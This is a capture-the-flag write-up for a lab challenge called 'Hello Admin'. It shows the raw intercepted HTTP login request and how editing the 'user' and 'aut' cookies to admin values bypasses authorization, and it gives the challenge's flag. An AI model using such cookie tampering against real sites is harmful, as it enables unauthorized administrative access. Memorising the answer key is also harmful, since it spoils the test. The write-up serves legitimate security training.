# Hello Admin
```
We need to access this page with admin privilege.
```
## Solution

The page has a username and password form. 
The source code has shows no signs.
However, if we check the `cookies` we have a cookie named `user` with content `anonymous`.
We tried to modify `anonymous` to `admin`.
Lets try using [Burp Suite](https://portswigger.net/burp/communitydownload)
If we press Enviar we get
```
POST /log_in.php HTTP/1.1
Host: lab.shellterlabs.com:33737
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://lab.shellterlabs.com:33737/index.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Cookie: _ga=GA1.2.1875004825.1522742332; _gid=GA1.2.1108648182.1522742334; user=anonymous; aut=0; PHPSESSID=eddece382d153bb154610b85f5d9ebc0
Connection: close
Upgrade-Insecure-Requests: 1

usuario=&senha=
```
So lets modify `user=anonymous; aut=0` to `user=admin; aut=1`
Then we press `Forward` we get
```
 Parabéns!

...

Time to get your flag!

flag = shellter{always_tamper_cookies}
```

flag is `shellter{always_tamper_cookies}`

